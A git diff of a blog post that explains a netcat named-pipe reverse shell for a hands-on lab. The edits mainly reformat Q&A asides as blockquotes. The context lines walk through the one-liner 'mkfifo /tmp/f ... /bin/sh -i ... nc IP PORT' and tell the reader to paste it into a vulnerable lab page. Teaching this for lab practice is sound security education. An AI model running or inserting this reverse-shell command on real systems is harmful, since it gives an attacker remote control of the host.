@@ -3,6 +3,7 @@ layout: post
 title:  "Anatomy of a Reverse Shell: nc named pipe"
 categories: 
 excerpt: "Breaking down the cryptic reverse shell using nc and named pipes. How the reverse shell works, and a hands-on docker lab to test out reverse shells."
+image: "
 ---
 
 In penetration testing and hacking one of the main goals is to obtain a reverse shell on the target/victim system. Sometimes the code and commands to obtain these reverse shells can be very complicated if you aren't familiar with every little peice of the command that is chained together. Today we'll be discussing a netcat named pipe reverse shell, and breaking it down to fully understand how this reverse shell works. 
@@ -36,9 +37,9 @@ Once new data shows up, it will read the contents and send those contents down t
 The contents of the `/tmp/f` file from the previous `cat` command are sent to the `/bin/sh` shell. We also supply the `-i` flag to `sh` which means this is an interactive session, and it will execute any commands as they are read in from `/tmp/f`. 
 
 Finally the `2>&1` says to redirect the error output into the standard output. By default error text is sent to a seperate error output stream and this is not sent forward to the next command, by redirecting error into standard output error text is then also sent to standard output so it is sent to the next command in the pipe.
-]
-**Why do almost all reverse shells use `/bin/sh` instead of the friendlier `/bin/bash`?**<br>
-Not all systems will have `/bin/bash` installed. However, the `/bin/sh` shell will *always* be avialable on all Unix/Linux operating systems, even embedded and IoT systems!
+
+> **Why do almost all reverse shells use `/bin/sh` instead of the friendlier `/bin/bash`?**<br>
+> Not all systems will have `/bin/bash` installed. However, the `/bin/sh` shell will *always* be avialable on all Unix/Linux operating systems, even embedded and IoT systems!
 
 **| nc IP PORT > /tmp/f**<br />
 Next we take the output of our `sh` command (which is executing commands it sees in the `/tmp/f` file) and use `netcat` to connect to our specified IP and PORT. In addition, any input we receive from the IP (ie: commands being typed in) will be written to the `/tmp/f` file where they will be read by `cat` and piped into `sh` to repeat this process.
@@ -121,5 +122,5 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.101 4444 > /
 
 Paste that command (updating the IP address as needed) into the input box on the site, and submit it. The webpage and browser should hang at this point, which is expected and normal. If we go to our terminal with the netcat listener we should see a shell prompt, and we can enter commands just like we did on the site, but this time instead of a web shell it's a reverse netcat shell!
 
-**Why does the browser hang?**<br>
-When the backend php code runs the reverse shell commands, the process never completes as the reverse shell process keeps repeating. Since this process never completes, the php process continues running and doesn't return any data to the browser. Eventually the php process will timeout and your reverse shell may be disconnected.
+> **Why does the browser hang?**<br>
+> When the backend php code runs the reverse shell commands, the process never completes as the reverse shell process keeps repeating. Since this process never completes, the php process continues running and doesn't return any data to the browser. Eventually the php process will timeout and your reverse shell may be disconnected.
